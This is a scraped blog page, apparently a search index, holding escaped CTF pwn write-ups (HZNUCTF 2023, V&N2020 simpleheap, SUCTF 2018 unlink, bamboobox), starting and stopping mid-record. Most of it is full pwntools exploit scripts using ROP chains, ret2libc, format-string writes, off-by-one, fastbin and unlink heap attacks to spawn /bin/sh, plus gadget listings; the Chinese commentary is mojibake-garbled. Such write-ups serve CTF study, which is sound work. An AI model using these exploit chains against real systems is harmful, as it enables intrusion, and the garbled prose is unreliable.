# 0x0000000000401a33 : pop rdi ; ret
# 0x0000000000401a31 : pop rsi ; pop r15 ; ret
# 0x0000000000401a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040143f : ret 0x2474
# 0x00000000004017ba : ret 0x458b
# 0x00000000004015c3 : ret 0x850f
# 0x0000000000401580 : ret 0x858b
# 0x00000000004013d1 : ret 0x8d48
# 0x000000000040134d : ret 0xc

# Unique gadgets found: 18

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;eazy_rw&#34;&gt;eazy_rw:&lt;/h3&gt;
&lt;p&gt;syscallæ„é€ readå‘bssæ®µä¸Šè¯»ropï¼ˆrwå·²ç»æœ‰oï¼‰&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28167)
# io=process(&amp;quot;./easy_rw&amp;quot;)
elf=ELF(&amp;quot;./easy_rw&amp;quot;)

bss_addr=0x404900
leave_ret=0x40126f
pop_rdi=0x4013c3
pop_rsi_r15=0x4013c1
read_sys=0x401349

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;)
payload=cyclic(0x40)+p64(bss_addr-0x8)+p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(read_sys)
io.send(payload)

#read
rw=p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(bss_addr+0x200)+p64(0)+p64(elf.sym[b&amp;quot;read&amp;quot;])
#puts
rw+=p64(pop_rdi)+p64(bss_addr+0x200)+p64(elf.sym[b&amp;quot;puts&amp;quot;])

payload=rw
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040126f : leave ; ret
# 0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013c0 : pop r14 ; pop r15 ; ret
# 0x00000000004013c2 : pop r15 ; ret
# 0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004011dd : pop rbp ; ret
# 0x00000000004013c3 : pop rdi ; ret
# 0x00000000004013c1 : pop rsi ; pop r15 ; ret
# 0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040124b : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 final å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8bTg9SHFI/"" data-c="
          &lt;p&gt;&lt;strong&gt;sign_in&lt;/strong&gt;:&lt;br&gt;
ret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sign_in&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28649)
elf=ELF(&amp;quot;./sign_in&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)


io.recvuntil(b&amp;quot;here~\n&amp;quot;)
pop_rdi_ret=0x401283
vuln=0x4011db
ret=0x40101a
payload=cyclic(0x48)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;here~\n&amp;quot;)
payload=cyclic(0x48)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;check_in&lt;/strong&gt;:&lt;br&gt;
è¦†ç›–canary&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28127)
elf=ELF(&amp;quot;./[HZNUCTF 2023 preliminary]checkin_pwn&amp;quot;)

io.recvuntil(b&amp;quot;checkin\n&amp;quot;)
bss_addr=0x4040C0
pop_rdi_ret=0x401483
payload=b&amp;quot;a&amp;quot;*0x28+p64(pop_rdi_ret)+p64(bss_addr)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+b&amp;quot;a&amp;quot;*(0xf00)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401480 : pop r14 ; pop r15 ; ret
# 0x0000000000401482 : pop r15 ; ret
# 0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x0000000000401483 : pop rdi ; ret
# 0x0000000000401481 : pop rsi ; pop r15 ; ret
# 0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;ffmt&lt;/strong&gt;ï¼š&lt;br&gt;
æ ¼å¼åŒ–å­—ç¬¦ä¸²&lt;br&gt;
è¾“å…¥æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸èƒ½ç›´æ¥fmtstr_payloadåŠ«æŒprintf_got&lt;br&gt;
ä½å®½è½¬æ¢ä¸ºåœ°å€å†™å…¥æ ˆä¸Šï¼Œæ³¨æ„backdooræœ‰åç§»&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ffmt&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28843)
elf=ELF(&amp;quot;./ffmt&amp;quot;)

shell=0x40121b
printf_got=elf.got[b&amp;quot;printf&amp;quot;]

io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;%p&amp;quot;)
addr=int(io.recv(14),16) #æ³„éœ²rbp
print(&amp;quot;addr:  &amp;quot;+hex(addr))

io.recvuntil(b&amp;quot;yourself~\n&amp;quot;)
# payload=fmtstr_payload(8,{printf_got:shell})
payload=b&amp;quot;a&amp;quot;*2+b&amp;quot;%.4198945d%8$n&amp;quot;+p64(addr-0x10)  #å†™å…¥rbp-0x10å¤„ å†™å…¥shellçš„å¯¹åº”åè¿›åˆ¶ä½å®½å¯è½¬åŒ–ä¸ºshellåœ°å€ï¼Œæ­¤é¢˜shellå†™åˆ°401221
# gdb.attach(io)
# pause()
io.sendline(payload)
 
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;shell&lt;/strong&gt;:&lt;br&gt;
é€†å‘ç¨å¾®æœ‰ç‚¹å¤æ‚ï¼Œé¦–å…ˆè¾“å…¥&amp;gt;è¿›å…¥å­å‡½æ•°ï¼Œç©ºæ ¼åˆ†éš”ç¬¦åæ»¡è¶³&lt;code&gt;&amp;lt;=\x1fæˆ–è€…&amp;gt;=z&lt;/code&gt;å³å¯è¿›å…¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„è¾“å…¥å¤„è¿›è¡Œret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./shell&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28569)
elf=ELF(&amp;quot;./shell&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)
pop_rdi_ret=0x401d13
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
vuln=0x401c34
ret=0x40101a

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;[haha]$&amp;quot;)
io.sendline(b&amp;quot;&amp;gt; {&amp;quot;)
io.recvuntil(b&amp;quot;name:&amp;quot;)
payload=cyclic(0x68)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)
io.sendline(b&amp;quot;cat flag&amp;quot;)
# print(&amp;quot;a:  &amp;quot;+hex(str_bin_sh))
# print(&amp;quot;b:  &amp;quot;+hex(sys_addr))
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401d0c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d10 : pop r14 ; pop r15 ; ret
# 0x0000000000401d12 : pop r15 ; ret
# 0x0000000000401d0b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401d0f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040141d : pop rbp ; ret
# 0x0000000000401a77 : pop rbx ; pop rbp ; ret
# 0x0000000000401d13 : pop rdi ; ret
# 0x0000000000401d11 : pop rsi ; pop r15 ; ret
# 0x0000000000401d0d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x0000000000401855 : ret 0x45c7
# 0x0000000000401593 : ret 0x8d48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">HZNUCTF 2023 preliminary å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/sXttqYc_0/"" data-c="
          &lt;p&gt;64ä½ä¿æŠ¤å…¨å¼€ï¼Œè€ƒå¯Ÿoff by oneä»¥åŠrealloc+offsetæé«˜æ ˆåœ°å€æ‰“one_gadget&lt;br&gt;
one_gadgetæ‰“é€šæ˜¯éœ€è¦ä¸€å®šæ¡ä»¶çš„ï¼Œå¦‚æœæ²¡æ‰“é€šå°±æ˜¯æ¡ä»¶æ²¡æ»¡è¶³&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¾‹å¦‚è¿™ä¸ªone_gadgetéœ€è¦æ»¡è¶³&lt;code&gt;[$rsp+0x30]==NULL&lt;/code&gt;ï¼Œ&lt;br&gt;
æ­¤é¢˜æ ‡å‡†èœå•å¢åˆ æ”¹æ˜¾ï¼Œdeleteæ²¡æœ‰uafï¼Œaddæ²¡æœ‰å †æº¢å‡ºï¼Œeditæœ‰æ£€æŸ¥ï¼Œä½†æ˜¯editå­˜åœ¨off by oneå¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚çš„sizeï¼Œä¿®æ”¹åå¯ä»¥åˆ©ç”¨unsortedbin æ³„éœ²åœ°å€ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤é¢˜ç›´æ¥ä½¿ç”¨malloc_hookæ‰“one_gadgetæ‰“ä¸é€šï¼Œå¦‚å›¾ï¼Œ&lt;code&gt;[$rsp+0x30]&lt;/code&gt;çš„å€¼ä¸ä¸º0&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680702994337.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ‰€ä»¥&lt;code&gt;malloc-&amp;gt;__malloc_hook-&amp;gt;realloc+offset-&amp;gt;__realloc_hook-&amp;gt;one_gadget&lt;/code&gt;&lt;br&gt;
é€šè¿‡ä¿®æ”¹reallocçš„åç§»æ›´æ”¹æ ˆåœ°å€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680704260750.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ¯å°‘ä¸€ä¸ªpushï¼Œæ ˆåœ°å€æé«˜8&lt;br&gt;
ä½†æ˜¯è¿™é“é¢˜+0x4å¥½åƒä¸å¤ªè¡Œï¼Œè‡³å°‘å¾—+0xc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28385)
elf=ELF(&amp;quot;./vn_pwn_simpleHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;size?&amp;quot;,str(n))
    io.sendafter(&amp;quot;content:&amp;quot;,c)

def edit(n,c):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;content:&amp;quot;,c)

def show(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))


add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
# one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[1]+libc_addr

add(0x60,b&amp;quot;wwwee&amp;quot;) #4 2
delete(4)

payload=p64(malloc_hook-0x23)
edit(2,payload) 
add(0x60,b&amp;quot;mmm&amp;quot;) #4


payload=cyclic(0xb)+p64(shell)+p64(realloc+0xc)
add(0x60,payload) #5

gdb.attach(io)
pause()

# add(0x30,b&amp;quot;aaa&amp;quot;)
io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(&amp;quot;size?&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
">V&N2020_simpleheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/J0ICAuGrD/"" data-c="
          &lt;p&gt;ä¸€é“64ä½unlinkæ¨¡æ¿ç»ƒä¹ é¢˜ï¼Œæ ‡å‡†èœå•ï¼Œæ²¡æœ‰uafï¼Œæ²¡æœ‰å †æº¢å‡ºï¼Œä½†editæ²¡æœ‰æ£€æŸ¥&lt;br&gt;
å…ˆæ”¾expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./[SUCTF 2018 æ‹›æ–°èµ›]unlink&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28457)
elf=ELF(&amp;quot;./[SUCTF 2018 æ‹›æ–°èµ›]unlink&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

bss_addr=0x6020C0
free_got=elf.got[b&amp;quot;free&amp;quot;]

def add(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;size : \n&amp;quot;)
    io.sendline(str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;delete\n&amp;quot;)
    io.sendline(str(n))

def show(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;show\n&amp;quot;)
    io.sendline(str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;modify :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;content\n&amp;quot;)
    io.send(cc)


add(0x30) #0
add(0x80) #1
add(0x40) #2


fd=bss_addr-0x18
bk=bss_addr-0x10
payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,payload)

# gdb.attach(io)
# pause()

delete(1) # 0&amp;lt;-1 unsorted bin 
edit(0,p64(0)*3+p64(free_got))
show(0)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;free&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))


sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,p64(sys_addr))
edit(2,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(2)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤é¢˜é¦–å…ˆç”³è¯·3ä¸ªå †å—ï¼Œå‰ä¸¤ä¸ªå †å—æ„é€ fake_chunkï¼Œç„¶åfreeæ‰chunk 1ä½¿chunk0å’Œ1åˆå¹¶è¿›å…¥unsorted binï¼Œåœ¨ä½¿ç”¨editå°†chunkçš„æŒ‡é’ˆä¿®æ”¹ä¸ºfree_gotåœ°å€ï¼Œæ¥ç€show(0)æ³„éœ²freeåœ°å€æ¥è®¡ç®—libcåŸºå€ï¼Œæœ€åä¿®æ”¹free_gotè¡¨åœ°å€ä¸ºsystemåœ°å€ï¼Œeditä¸€å—å †å—ä¸º&amp;quot;/bin/sh\x00&amp;quot;ï¼Œæœ€åfreeæ‰è¯¥å †å—å³å¯getshell&lt;/p&gt;
">[SUCTF 2018 æ‹›æ–°èµ›]unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DwLogOagh/"" data-c="
          &lt;p&gt;64ä½æ ‡å‡†èœå•é¢˜ï¼Œæ— uafï¼Œå¼€å¯canaryå’Œnxä¿æŠ¤ï¼Œå­˜åœ¨å †æº¢å‡º&lt;br&gt;
æ­¤é¢˜ç¬¬ä¸€æ¬¡å°è¯•ç”¨fastbin attackæ‰“ï¼ŒåŠ«æŒ__malloc_hookæ‰“one_gadget&lt;br&gt;
&lt;s&gt;ä½†å®è·µè¿‡ç¨‹ä¸­one_gadgetå‡ºé”…ï¼Œè¿˜æ˜¯æ”¾ä¸‹ä¸å®Œå…¨çš„exp&lt;/s&gt;å…¶å®æ˜¯fastbin attackå†™é”™äº†ï¼Œç›¸ä¿¡ç»†å¿ƒçš„ä½ ä¸€å®šèƒ½æ‰¾å‡ºæˆ‘å½“æ—¶çš„é”™è¯¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29708)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]


def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

# add(0x40,b&amp;quot;asd&amp;quot;) #0
add(0x10,b&amp;quot;cqb&amp;quot;) #0
add(0x40,b&amp;quot;opo&amp;quot;) #1
add(0x30,b&amp;quot;unun&amp;quot;) #2
add(0x10,b&amp;quot;iii&amp;quot;) #3

payload=cyclic(0x10)+p64(0)+p64(0x91)
edit(0,len(payload),payload)

delete(1)
add(0x40,b&amp;quot;aaa&amp;quot;) #1
show()
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;free_hook:  &amp;quot;+hex(free_hook))
shell=libc_addr+one_gadget[0]


gdb.attach(io)
pause()
add(0x30,b&amp;quot;ppp&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x40,b&amp;quot;qqq&amp;quot;) #6
delete(5)



payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)

add(0x60,p64(shell)) #5
add(0x60,cyclic(0x13)+p64(shell)) #fake_chunk
add(0x40,b&amp;quot;aaa&amp;quot;)


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰“ä¸é€šæ¢unlinkåšæ³•&lt;br&gt;
å…ˆæ”¾expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27423)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]
bss_addr=0x6020C8
# pf_got=elf.got[b&amp;quot;printf&amp;quot;]
atoi_got=elf.got[b&amp;quot;atoi&amp;quot;]
free_got=elf.got[b&amp;quot;free&amp;quot;]

def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

add(0x30,b&amp;quot;aaa&amp;quot;) 
